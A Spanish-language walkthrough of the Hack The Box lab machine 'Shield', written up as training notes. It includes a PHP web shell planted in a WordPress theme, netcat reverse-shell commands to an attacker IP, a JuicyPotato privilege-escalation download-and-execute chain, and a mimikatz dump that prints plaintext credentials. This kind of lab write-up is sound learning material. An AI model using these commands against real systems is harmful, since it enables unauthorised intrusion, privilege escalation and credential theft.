# Shield

Comenzamos como siempre haciendo una enumeración del sistema, recuerdo que utilizamos T5 porque estamos en un entorno controlado y podemos hacer peticiones más rápidas, también podríamos utilizar min-rate o incluso algún script más rápido si quisiésemos.

```
ping -c 1 10.10.10.29

PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
64 bytes from 10.10.10.29: icmp_seq=1 ttl=127 time=40.9 ms

--- 10.10.10.29 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 40.894/40.894/40.894/0.000 ms

#Es una máquina Windows por el ttl

nmap -p- --open -T5 10.10.10.29 -n

nmap -p80,3306 -sC -sV -n -Pn 10.10.10.29

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-02 10:18 CEST
Nmap scan report for 10.10.10.29
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Servicio Web

Al estar abierto el puerto 80 nos vamos directamente a nuestro navegador y nos encontramos una foto de Windows Server y al comprobar el código fuente no vemos nada, así que comencemos a realizar un fuzzing web a ver si sacamos algo más.

```
gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150
```

El fuzzing nos muestra que existe "http://10.10.10.29/wordpress" Así que vamos a echarle un ojo

```
whatweb http://10.10.10.29/wordpress

http://10.10.10.29 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.29], Microsoft-IIS[10.0], Title[IIS Windows Server]
```

No nos lo ha detectado como wordpress pero miremos con la extensión wappalyzer de chrome

![](<../../.gitbook/assets/image (4).png>)

Estamos ante un gestor de contenidos Wordpress y el SO es Windows Server, algo que podíamos deducir por las pistas que nos han dejado pero es importante igualmente tenerlo en cuenta. En este punto es importante que aunque vayamos a mirar el código fuente, veamos la página por dentro, nos podamos imaginar que el login está en wp-admin etc... Lo primero que deberíamos hacer es continuar con un nuevo fuzzing desde esta dirección mientras realizamos esos pasos.

Tras buscar manualmente por la web nos encontramos un comentario de "admin" y el wp-admin que redirige a un wp-login. Ahora podríamos probar algunas de las contraseñas que tenemos del starting point con el usuario admin, o el típico admin:admin...

Y efectivamente una de las contraseñas nos ha funcionado "admin:P@s5w0rd!"

Ya estamos dentro del área de administrador de Wordpress por lo que podemos utilizarla para acceder a la máquina...

### WORDPRESS

Podríamos utilizar varios métodos, por supuesto el que os voy a enseñar no tiene porque ser el mejor, pero tras varios errores por otros métodos decidí acabar con este:

En la sección Uploads vamos a subir un binario de netcat (Renombrando antes de .exe a .txt para que nos deje subirlo)

Por otro lado vamos a utilizar en Appearance > Theme Editor en la plantilla GutenBooster dentro del 404.php, donde vamos a establecernos una falsa shell de navegador (Recordad activar este tema desde Appearance > Themes)

```
<?php

echo"<html>";

echo "<form method=GET><input type=text name=c style=width:400px;'><input type=submit value=Execute style='height:34px;'></form>";

echo "<pre>";
$a = system($_GET["c"]);
echo "</pre></html>";
?>
```

A continuación dentro de la shell de navegador cambiamos de .txt a .exe para tener nuestro ejecutable preparado.

```
powershell move C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.txt C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe
```

Ahora con todo esto preparado podemos enviarnos una reverse shell sin mayor problema

```
sudo rlwrap nc -nlvp 1234

#En la falsa shell de navegador
C:\inetpub\wwwroot\wordpress\wp-content\uploads\rat.exe -e cmd 10.10.16.29 1234
```

### ESCALAR PRIVILEGIOS

Haciendo una enumeración rápida nos encontramos con un [Juicy Potato](../../pentesting/escalada-de-privilegios/windows/juicy-potato.md)

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

```

Lo primero que vamos a hacer es traernos nuestro Juicy desde [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) y enviarlo a la máquina atacada.

```
mv juicypotato.exe potato.txt
sudo python -m http.server 80
sudo rlwrap nc -nlvp 1111

#En la máquina atacada
powershell Invoke-WebRequest -Uri "http://10.10.16.29/potato.txt" -OutFile "potato.txt"
powershell move potato.txt potato.exe
echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.29 1111 > shell.bat
potato.exe -l 1337 -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\rat\shell.bat -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

Más info en [Juicy Potato](../../pentesting/escalada-de-privilegios/windows/juicy-potato.md)

### POST-EXPLOTACIÓN

Podemos usar nuestro bien hallado mimikatz, lo envíamos igual que el resto de archivos que hemos estado usando lo iniciamos y buscamos información:

```
.\mimikatz.exe

sekurlsa::logonpasswords

	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : sandra
	 * Domain   : MEGACORP.LOCAL
	 * Password : Password1234!
```

Y nos quedamos con ese usuario y contraseña para otras posibles máquinas futuras.



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
